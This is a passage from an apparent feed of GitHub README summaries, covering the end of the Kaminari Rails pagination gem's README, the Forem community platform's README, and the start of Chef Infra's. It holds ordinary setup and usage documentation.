Helper&lt;/h2&gt; &#xA;&lt;p&gt;Kaminari includes a handy template generator.&lt;/p&gt; &#xA;&lt;h3&gt;To Edit Your Paginator&lt;/h3&gt; &#xA;&lt;p&gt;Run the generator first,&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;% rails g kaminari:views default&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;then edit the partials in your app&#39;s &lt;code&gt;app/views/kaminari/&lt;/code&gt; directory.&lt;/p&gt; &#xA;&lt;h3&gt;For Haml/Slim Users&lt;/h3&gt; &#xA;&lt;p&gt;You can use the &lt;a href=&#34;https://github.com/haml/html2haml&#34;&gt;html2haml gem&lt;/a&gt; or the &lt;a href=&#34;https://github.com/slim-template/html2slim&#34;&gt;html2slim gem&lt;/a&gt; to convert erb templates. The kaminari gem will automatically pick up haml/slim templates if you place them in &lt;code&gt;app/views/kaminari/&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Multiple Templates&lt;/h3&gt; &#xA;&lt;p&gt;In case you need different templates for your paginator (for example public and admin), you can pass &lt;code&gt;--views-prefix directory&lt;/code&gt; like this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;% rails g kaminari:views default --views-prefix admin&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;that will generate partials in &lt;code&gt;app/views/admin/kaminari/&lt;/code&gt; directory.&lt;/p&gt; &#xA;&lt;h3&gt;Themes&lt;/h3&gt; &#xA;&lt;p&gt;The generator has the ability to fetch several sample template themes from the external repository (&lt;a href=&#34;https://github.com/amatsuda/kaminari_themes&#34;&gt;https://github.com/amatsuda/kaminari_themes&lt;/a&gt;) in addition to the bundled &#34;default&#34; one, which will help you creating a nice looking paginator.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;% rails g kaminari:views THEME&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To see the full list of available themes, take a look at the themes repository, or just hit the generator without specifying &lt;code&gt;THEME&lt;/code&gt; argument.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;% rails g kaminari:views&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Multiple Themes&lt;/h3&gt; &#xA;&lt;p&gt;To utilize multiple themes from within a single application, create a directory within the app/views/kaminari/ and move your custom template files into that directory.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;% rails g kaminari:views default (skip if you have existing kaminari views)&#xA;% cd app/views/kaminari&#xA;% mkdir my_custom_theme&#xA;% cp _*.html.* my_custom_theme/&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Next, reference that directory when calling the &lt;code&gt;paginate&lt;/code&gt; method:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-erb&#34;&gt;&amp;lt;%= paginate @users, theme: &#39;my_custom_theme&#39; %&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Customize away!&lt;/p&gt; &#xA;&lt;p&gt;Note: if the theme isn&#39;t present or none is specified, kaminari will default back to the views included within the gem.&lt;/p&gt; &#xA;&lt;h2&gt;Paginating Without Issuing SELECT COUNT Query&lt;/h2&gt; &#xA;&lt;p&gt;Generally the paginator needs to know the total number of records to display the links, but sometimes we don&#39;t need the total number of records and just need the &#34;previous page&#34; and &#34;next page&#34; links. For such use case, Kaminari provides &lt;code&gt;without_count&lt;/code&gt; mode that creates a paginatable collection without counting the number of all records. This may be helpful when you&#39;re dealing with a very large dataset because counting on a big table tends to become slow on RDBMS.&lt;/p&gt; &#xA;&lt;p&gt;Just add &lt;code&gt;.without_count&lt;/code&gt; to your paginated object:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;User.page(3).without_count&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;In your view file, you can only use simple helpers like the following instead of the full-featured &lt;code&gt;paginate&lt;/code&gt; helper:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-erb&#34;&gt;&amp;lt;%= link_to_prev_page @users, &#39;Previous Page&#39; %&amp;gt;&#xA;&amp;lt;%= link_to_next_page @users, &#39;Next Page&#39; %&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Paginating a Generic Array object&lt;/h2&gt; &#xA;&lt;p&gt;Kaminari provides an Array wrapper class that adapts a generic Array object to the &lt;code&gt;paginate&lt;/code&gt; view helper. However, the &lt;code&gt;paginate&lt;/code&gt; helper doesn&#39;t automatically handle your Array object (this is intentional and by design). &lt;code&gt;Kaminari::paginate_array&lt;/code&gt; method converts your Array object into a paginatable Array that accepts &lt;code&gt;page&lt;/code&gt; method.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;@paginatable_array = Kaminari.paginate_array(my_array_object).page(params[:page]).per(10)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can specify the &lt;code&gt;total_count&lt;/code&gt; value through options Hash. This would be helpful when handling an Array-ish object that has a different &lt;code&gt;count&lt;/code&gt; value from actual &lt;code&gt;count&lt;/code&gt; such as RSolr search result or when you need to generate a custom pagination. For example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;@paginatable_array = Kaminari.paginate_array([], total_count: 145).page(params[:page]).per(10)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;or, in the case of using an external API to source the page of data:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;page_size = 10&#xA;one_page = get_page_of_data params[:page], page_size&#xA;@paginatable_array = Kaminari.paginate_array(one_page.data, total_count: one_page.total_count).page(params[:page]).per(page_size)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Creating Friendly URLs and Caching&lt;/h2&gt; &#xA;&lt;p&gt;Because of the &lt;code&gt;page&lt;/code&gt; parameter and Rails routing, you can easily generate SEO and user-friendly URLs. For any resource you&#39;d like to paginate, just add the following to your &lt;code&gt;routes.rb&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;resources :my_resources do&#xA;  get &#39;page/:page&#39;, action: :index, on: :collection&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you are using Rails 4 or later, you can simplify route definitions by using &lt;code&gt;concern&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;concern :paginatable do&#xA;  get &#39;(page/:page)&#39;, action: :index, on: :collection, as: &#39;&#39;&#xA;end&#xA;&#xA;resources :my_resources, concerns: :paginatable&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This will create URLs like &lt;code&gt;/my_resources/page/33&lt;/code&gt; instead of &lt;code&gt;/my_resources?page=33&lt;/code&gt;. This is now a friendly URL, but it also has other added benefits...&lt;/p&gt; &#xA;&lt;p&gt;Because the &lt;code&gt;page&lt;/code&gt; parameter is now a URL segment, we can leverage on Rails page &lt;a href=&#34;http://guides.rubyonrails.org/caching_with_rails.html#page-caching&#34;&gt;caching&lt;/a&gt;!&lt;/p&gt; &#xA;&lt;p&gt;NOTE: In this example, I&#39;ve pointed the route to my &lt;code&gt;:index&lt;/code&gt; action. You may have defined a custom pagination action in your controller - you should point &lt;code&gt;action: :your_custom_action&lt;/code&gt; instead.&lt;/p&gt; &#xA;&lt;h2&gt;Other Framework/Library Support&lt;/h2&gt; &#xA;&lt;h3&gt;The kaminari gem&lt;/h3&gt; &#xA;&lt;p&gt;Technically, the kaminari gem consists of 3 individual components:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;kaminari-core: the core pagination logic&#xA;kaminari-activerecord: Active Record adapter&#xA;kaminari-actionview: Action View adapter&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;So, bundling &lt;code&gt;gem &#39;kaminari&#39;&lt;/code&gt; is equivalent to the following 2 lines (kaminari-core is referenced from the adapters):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;gem &#39;kaminari-activerecord&#39;&#xA;gem &#39;kaminari-actionview&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;For Other ORM Users&lt;/h3&gt; &#xA;&lt;p&gt;If you want to use other supported ORMs instead of ActiveRecord, for example Mongoid, bundle its adapter instead of kaminari-activerecord.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;gem &#39;kaminari-mongoid&#39;&#xA;gem &#39;kaminari-actionview&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Kaminari currently provides adapters for the following ORMs:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Active Record: &lt;a href=&#34;https://github.com/kaminari/kaminari/tree/master/kaminari-activerecord&#34;&gt;https://github.com/kaminari/kaminari/tree/master/kaminari-activerecord&lt;/a&gt; (included in this repo)&lt;/li&gt; &#xA; &lt;li&gt;Mongoid: &lt;a href=&#34;https://github.com/kaminari/kaminari-mongoid&#34;&gt;https://github.com/kaminari/kaminari-mongoid&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;MongoMapper: &lt;a href=&#34;https://github.com/kaminari/kaminari-mongo_mapper&#34;&gt;https://github.com/kaminari/kaminari-mongo_mapper&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;DataMapper: &lt;a href=&#34;https://github.com/kaminari/kaminari-data_mapper&#34;&gt;https://github.com/kaminari/kaminari-data_mapper&lt;/a&gt; (would not work on kaminari 1.0.x)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;For Other Web Framework Users&lt;/h3&gt; &#xA;&lt;p&gt;If you want to use other web frameworks instead of Rails + Action View, for example Sinatra, bundle its adapter instead of kaminari-actionview.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;gem &#39;kaminari-activerecord&#39;&#xA;gem &#39;kaminari-sinatra&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Kaminari currently provides adapters for the following web frameworks:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Action View: &lt;a href=&#34;https://github.com/kaminari/kaminari/tree/master/kaminari-actionview&#34;&gt;https://github.com/kaminari/kaminari/tree/master/kaminari-actionview&lt;/a&gt; (included in this repo)&lt;/li&gt; &#xA; &lt;li&gt;Sinatra: &lt;a href=&#34;https://github.com/kaminari/kaminari-sinatra&#34;&gt;https://github.com/kaminari/kaminari-sinatra&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Grape: &lt;a href=&#34;https://github.com/kaminari/kaminari-grape&#34;&gt;https://github.com/kaminari/kaminari-grape&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;For More Information&lt;/h2&gt; &#xA;&lt;p&gt;Check out Kaminari recipes on the GitHub Wiki for more advanced tips and techniques. &lt;a href=&#34;https://github.com/kaminari/kaminari/wiki/Kaminari-recipes&#34;&gt;https://github.com/kaminari/kaminari/wiki/Kaminari-recipes&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Questions, Feedback&lt;/h2&gt; &#xA;&lt;p&gt;Feel free to message me on Github (amatsuda) or Twitter (&lt;a href=&#34;https://twitter.com/a_matsuda&#34;&gt;@a_matsuda&lt;/a&gt;) ☇☇☇ :)&lt;/p&gt; &#xA;&lt;h2&gt;Contributing to Kaminari&lt;/h2&gt; &#xA;&lt;p&gt;Fork, fix, then send a pull request.&lt;/p&gt; &#xA;&lt;p&gt;To run the test suite locally against all supported frameworks:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;% bundle install&#xA;% rake test:all&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To target the test suite against one framework:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;% rake test:active_record_50&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can find a list of supported test tasks by running &lt;code&gt;rake -T&lt;/code&gt;. You may also find it useful to run a specific test for a specific framework. To do so, you&#39;ll have to first make sure you have bundled everything for that configuration, then you can run the specific test:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;% BUNDLE_GEMFILE=&#39;gemfiles/active_record_50.gemfile&#39; bundle install&#xA;% BUNDLE_GEMFILE=&#39;gemfiles/active_record_50.gemfile&#39; TEST=kaminari-core/test/requests/navigation_test.rb bundle exec rake test&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Copyright&lt;/h2&gt; &#xA;&lt;p&gt;Copyright (c) 2011- Akira Matsuda. See MIT-LICENSE for further details.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>forem/forem</title>
    <updated>2022-05-30T01:32:15Z</updated>
    <id>tag:github.com,2022-05-30:/forem/forem</id>
    <link href="https://github.com/forem/forem" rel="alternate"></link>
    <summary type="html">&lt;p&gt;For empowering community 🌱&lt;/p&gt;&lt;hr&gt;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;br&gt; &#xA; &lt;h1&gt;Forem 🌱&lt;/h1&gt; &#xA; &lt;strong&gt;For Empowering Community&lt;/strong&gt; &#xA;&lt;/div&gt; &#xA;&lt;br&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;a href=&#34;https://app.travis-ci.com/github/forem/forem&#34;&gt; &lt;img src=&#34;https://api.travis-ci.com/forem/forem.svg?branch=main&#34; alt=&#34;Build Status&#34;&gt; &lt;/a&gt; &lt;img src=&#34;https://img.shields.io/github/commit-activity/w/forem/forem&#34; alt=&#34;GitHub commit activity&#34;&gt; &lt;a href=&#34;https://github.com/forem/forem/issues?q=is%3Aissue+is%3Aopen+label%3A%22ready+for+dev%22&#34;&gt; &lt;img src=&#34;https://img.shields.io/github/issues/forem/forem/ready for dev&#34; alt=&#34;GitHub issues ready for dev&#34;&gt; &lt;/a&gt; &lt;a href=&#34;https://gitpod.io/#https://github.com/forem/forem&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/setup-automated-blue?logo=gitpod&#34; alt=&#34;GitPod badge&#34;&gt; &lt;/a&gt; &lt;/p&gt; &#xA;&lt;p&gt;Welcome to the &lt;a href=&#34;https://forem.com&#34;&gt;Forem&lt;/a&gt; codebase, the platform that powers &lt;a href=&#34;https://dev.to&#34;&gt;dev.to&lt;/a&gt;. We are so excited to have you. With your help, we can build out Forem’s usability, scalability, and stability to better serve our communities.&lt;/p&gt; &#xA;&lt;h2&gt;What is Forem?&lt;/h2&gt; &#xA;&lt;p&gt;Forem is open source software for building communities. Communities for your peers, customers, fanbases, families, friends, and any other time and space where people need to come together to be part of a collective. &lt;a href=&#34;https://dev.to/devteam/for-empowering-community-2k6h&#34;&gt;See our announcement post&lt;/a&gt; for a high-level overview of what Forem is.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://dev.to&#34;&gt;dev.to&lt;/a&gt; (or just DEV) is hosted by Forem. It is a community of software developers who write articles, take part in discussions, and build their professional profiles. We value supportive and constructive dialogue in the pursuit of great code and career growth for all members. The ecosystem spans from beginner to advanced developers, and all are welcome to find their place within our community. ❤️&lt;/p&gt; &#xA;&lt;h2&gt;Table of Contents&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/forem/forem/main/#what-is-forem&#34;&gt;What is Forem?&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/forem/forem/main/#table-of-contents&#34;&gt;Table of Contents&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/forem/forem/main/#community&#34;&gt;Community&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/forem/forem/main/#contributing&#34;&gt;Contributing&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/forem/forem/main/#getting-started&#34;&gt;Getting Started&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/forem/forem/main/#prerequisites&#34;&gt;Prerequisites&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/forem/forem/main/#local&#34;&gt;Local&lt;/a&gt;&lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/forem/forem/main/#containers&#34;&gt;Containers&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/forem/forem/main/#installation-documentation&#34;&gt;Installation Documentation&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/forem/forem/main/#developer-documentation&#34;&gt;Developer Documentation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/forem/forem/main/#core-team&#34;&gt;Core team&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/forem/forem/main/#vulnerability-disclosure&#34;&gt;Vulnerability disclosure&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/forem/forem/main/#license&#34;&gt;License&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Community&lt;/h2&gt; &#xA;&lt;p&gt;For a place to have open discussions on features, voice your ideas, or get help with general questions please visit our community at &lt;a href=&#34;https://forem.dev/&#34;&gt;forem.dev&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;We encourage you to contribute to Forem! Please check out the &lt;a href=&#34;https://developers.forem.com/contributing-guide/forem&#34;&gt;Contributing to Forem guide&lt;/a&gt; for guidelines about how to proceed.&lt;/p&gt; &#xA;&lt;h2&gt;Getting Started&lt;/h2&gt; &#xA;&lt;p&gt;This section provides a high-level quick start guide. If you&#39;re looking for a more thorough installation guide (for example &lt;a href=&#34;https://developers.forem.com/getting-started/installation/mac&#34;&gt;with macOS&lt;/a&gt;, you&#39;ll want to refer to our complete &lt;a href=&#34;https://developers.forem.com/&#34;&gt;Developer Documentation&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;We run on a &lt;a href=&#34;https://rubyonrails.org/&#34;&gt;Rails&lt;/a&gt; backend, and we are currently transitioning to a &lt;a href=&#34;https://preactjs.com/&#34;&gt;Preact&lt;/a&gt;-first frontend.&lt;/p&gt; &#xA;&lt;p&gt;A more complete overview of our stack is available in &lt;a href=&#34;https://developers.forem.com/technical-overview/stack&#34;&gt;our docs&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;To &lt;strong&gt;launch Forem in Gitpod&lt;/strong&gt;, navigate to &lt;a href=&#34;https://gitpod.io/#https://github.com/%7Byour_github_username%7D/forem&#34;&gt;https://gitpod.io/#https://github.com/{your_github_username}/forem&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Prerequisites&lt;/h3&gt; &#xA;&lt;h4&gt;Local&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.ruby-lang.org/en/&#34;&gt;Ruby&lt;/a&gt;: we recommend using &lt;a href=&#34;https://github.com/rbenv/rbenv&#34;&gt;rbenv&lt;/a&gt; to install the Ruby version listed on the badge.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://yarnpkg.com/&#34;&gt;Yarn&lt;/a&gt; 1.x: please refer to their &lt;a href=&#34;https://classic.yarnpkg.com/en/docs/install&#34;&gt;installation guide&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.postgresql.org/&#34;&gt;PostgreSQL&lt;/a&gt; 11 or higher.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://imagemagick.org/&#34;&gt;ImageMagick&lt;/a&gt;: please refer to ImageMagick&#39;s &lt;a href=&#34;https://imagemagick.org/script/download.php&#34;&gt;installation instructions&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://redis.io/&#34;&gt;Redis&lt;/a&gt; 4 or higher.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Containers&lt;/h4&gt; &#xA;&lt;p&gt;&lt;strong&gt;Linux&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/containers/libpod&#34;&gt;Podman&lt;/a&gt; 1.9.2 or higher&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/containers/podman-compose&#34;&gt;Podman Compose&lt;/a&gt; 0.1.5 or higher&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;OS X&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.docker.com/docker-for-mac/install/&#34;&gt;Docker Desktop for Mac&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Installation Documentation&lt;/h3&gt; &#xA;&lt;p&gt;Please see our installation guides, such as the &lt;a href=&#34;https://developers.forem.com/getting-started/installation/mac&#34;&gt;one for macOS&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Developer Documentation&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://developers.forem.com&#34;&gt;Check out our dedicated docs page for more technical documentation&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Core team&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dev.to/ben&#34;&gt;@benhalpern&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dev.to/jess&#34;&gt;@jessleenyc&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dev.to/peter&#34;&gt;@peterkimfrank&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dev.to/maestromac&#34;&gt;@maestromac&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dev.to/andy&#34;&gt;@zhao-andy&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dev.to/lightalloy&#34;&gt;@lightalloy&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://dev.to/joshpuetz&#34;&gt;@joshpuetz&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dev.to/juliannatetreault&#34;&gt;@juliannatetreault&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dev.to/ridhwana&#34;&gt;@ridhwana&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dev.to/fdoxyz&#34;&gt;@fdoxyz&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dev.to/msarit&#34;&gt;@msarit&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dev.to/jdoss&#34;&gt;@jdoss&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dev.to/coffeecraftcode&#34;&gt;@cmgorton&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dev.to/andygeorge&#34;&gt;@andygeorge&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dev.to/phannon716&#34;&gt;@phannon716&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dev.to/s_aitchison&#34;&gt;@s_aitchison&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dev.to/rt4914&#34;&gt;@rt4914&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dev.to/jeremyf&#34;&gt;@jeremyf&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dev.to/dscottS3&#34;&gt;@dscottS3&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dev.to/asheren&#34;&gt;@asheren&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Vulnerability disclosure&lt;/h2&gt; &#xA;&lt;p&gt;Forem is the open source software which powers &lt;a href=&#34;https://dev.to&#34;&gt;DEV&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;We welcome security research on DEV under the terms of our &lt;a href=&#34;https://dev.to/security&#34;&gt;vulnerability disclosure policy&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Acknowledgments&lt;/h2&gt; &#xA;&lt;p&gt;Thank you to the &lt;a href=&#34;https://github.com/twitter/twemoji&#34;&gt;Twemoji project&lt;/a&gt; for the usage of their emojis.&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;This program is free software: you can redistribute it and/or modify it under the terms of the GNU Affero General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version. Please see the &lt;a href=&#34;https://raw.githubusercontent.com/forem/forem/main/LICENSE.md&#34;&gt;LICENSE&lt;/a&gt; file in our repository for the full text.&lt;/p&gt; &#xA;&lt;p&gt;Like many open source projects, we require that contributors provide us with a Contributor License Agreement (CLA). By submitting code to the Forem project, you are granting us a right to use that code under the terms of the CLA.&lt;/p&gt; &#xA;&lt;p&gt;Our version of the CLA was adapted from the Microsoft Contributor License Agreement, which they generously made available to the public domain under Creative Commons CC0 1.0 Universal.&lt;/p&gt; &#xA;&lt;p&gt;Any questions, please refer to our &lt;a href=&#34;https://developers.forem.com/licensing/&#34;&gt;license FAQ&lt;/a&gt; doc or email &lt;a href=&#34;mailto:yo@dev.to&#34;&gt;yo@dev.to&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;br&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img alt=&#34;Sloan, the sloth mascot&#34; width=&#34;250px&#34; src=&#34;https://thepracticaldev.s3.amazonaws.com/uploads/user/profile_image/31047/af153cd6-9994-4a68-83f4-8ddf3e13f0bf.jpg&#34;&gt; &lt;br&gt; &lt;strong&gt;Happy Coding&lt;/strong&gt; ❤️ &lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/forem/forem/main/#Table-of-contents&#34;&gt;⬆ Back to Top&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>chef/chef</title>
    <updated>2022-05-30T01:32:15Z</updated>
    <id>tag:github.com,2022-05-30:/chef/chef</id>
    <link href="https://github.com/chef/chef" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Chef Infra, a powerful automation platform that transforms infrastructure into code automating how infrastructure is configured, deployed and managed across any environment, at any scale&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Chef Infra&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://codeclimate.com/github/chef/chef&#34;&gt;&lt;img src=&#34;https://codeclimate.com/github/chef/chef.svg?sanitize=true&#34; alt=&#34;Code Climate&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://buildkite.com/chef-oss/chef-chef-main-verify&#34;&gt;&lt;img src=&#34;https://badge.buildkite.com/c82093430ceec7d27af05febb9dcafe3aa331fff9d74c0ab9d.svg?branch=main&#34; alt=&#34;Build Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://badge.fury.io/rb/chef&#34;&gt;&lt;img src=&#34;https://badge.fury.io/rb/chef.svg?sanitize=true&#34; alt=&#34;Gem Version&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/chef/chef/raw/main/docs/dev/design_documents/client_release_cadence.md&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Release%20Policy-Cadence%20Release-brightgreen.svg?sanitize=true&#34; alt=&#34;&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Umbrella Project&lt;/strong&gt;: &lt;a href=&#34;https://github.com/chef/chef-oss-practices/raw/main/projects/chef-infra.md&#34;&gt;Chef Infra&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Project State&lt;/strong&gt;: &lt;a href=&#34;https://github.com/chef/chef-oss-practices/raw/main/repo-management/repo-states.md#active&#34;&gt;Active&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Issues &lt;a href=&#34;https://github.com/chef/chef-oss-practices/raw/main/repo-management/repo-states.md&#34;&gt;Response Time 